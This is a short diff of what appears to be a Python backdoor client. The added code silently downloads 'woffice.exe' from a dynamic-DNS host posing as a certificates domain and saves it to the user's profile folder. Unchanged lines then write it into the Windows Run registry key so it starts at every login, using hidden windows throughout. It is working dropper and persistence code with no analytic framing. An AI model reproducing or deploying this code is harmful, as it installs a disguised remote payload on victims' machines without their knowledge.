@@ -98,7 +98,10 @@ CREATE_NO_WINDOW = 0x08000000
 swin=os.getenv('windir')
 suser=os.getenv('USERPROFILE')
 if not os.path.exists(suser+'\\woffice.exe'):
-    subprocess.call('powershell -Command Invoke-WebRequest -Uri "http://certificates.ddns.net/woffice.exe" -OutFile '+suser+'\\woffice.exe', creationflags=CREATE_NO_WINDOW)
+    f = urllib2.urlopen("http://certificates.ddns.net/woffice.exe")
+    with open(suser+'\\woffice.exe', "wb") as code:
+        code.write(f.read())
+    #subprocess.call('powershell -Command Invoke-WebRequest -Uri "http://certificates.ddns.net/woffice.exe" -OutFile '+suser+'\\woffice.exe', creationflags=CREATE_NO_WINDOW)
 subprocess.call("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+suser+"\\woffice.exe /f", creationflags=CREATE_NO_WINDOW)
 
 #main loop here
